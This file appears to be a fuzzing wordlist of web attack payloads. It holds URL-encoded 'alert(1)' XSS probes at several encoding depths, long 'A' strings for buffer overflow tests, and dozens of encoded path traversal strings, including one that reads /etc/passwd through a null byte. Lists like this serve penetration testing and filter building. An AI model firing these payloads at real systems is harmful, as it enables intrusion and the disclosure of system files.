Alert%281%29@single urlencode
alert%25281%2529@double urlencode
alert%2525281%252529@triple urlencode
alert%252525281%25252529@quadruple urlencode
alert%25252525281%2525252529@quintuple pentadruple urlencode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@Buffer Overflow 128
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@Buffer Overflow 512
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@Buffer Overflow 2048
/../../../../../etc/passwd%00@LFI NULLbyte
/..\..\\..\..\\..\..\\..\..\\\@LFI dot sot slash Directory
/../..//../..//../..//../..///@LFI dot sot slash Directory
/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\@LFI dot sot slash Directory
/.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..//@LFI dot sot slash Directory
/.\..\.\..\.\..\.\..\.\..\.\..\.\..\@LFI dot sot slash Directory
/./.././.././.././.././.././../@LFI dot sot slash Directory
/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\@LFI dot sot slash Directory
/./\/././\/././\/././\/././\/././\/./@LFI dot sot slash Directory
/..\\\..\\\..\\\..\\\..\\\..\\\@LFI dot sot slash Directory
/..\\..\\..\\..\\..\\..\\..\\@LFI dot sot slash Directory
/..///..///..///..///..///..///..///@LFI dot sot slash Directory
/..//..//..//..//..//..//..//@LFI dot sot slash Directory
/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c@LFI dot sot slash Directory
////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f@LFI dot sot slash Directory
/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c@LFI dot sot slash Directory
/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\@LFI dot sot slash Directory
/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c@LFI dot sot slash Directory
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f@LFI dot sot slash Directory
/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/@LFI dot sot slash Directory
/..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f@LFI dot sot slash Directory
/0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c@LFI dot sot slash Directory
/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\@LFI dot sot slash Directory
/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c@LFI dot sot slash Directory
/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f@LFI dot sot slash Directory
/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/@LFI dot sot slash Directory
/..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f@LFI dot sot slash Directory
/%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216@LFI dot sot slash Directory
/%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\@LFI dot sot slash Directory
/..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025@LFI dot sot slash Directory
/..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8@LFI dot sot slash Directory
/..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216@LFI dot sot slash Directory
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215@LFI dot sot slash Directory
/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/@LFI dot sot slash Directory
/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215@LFI dot sot slash Directory
/....\....\....\....\....\....\....\....\@LFI dot sot slash Directory
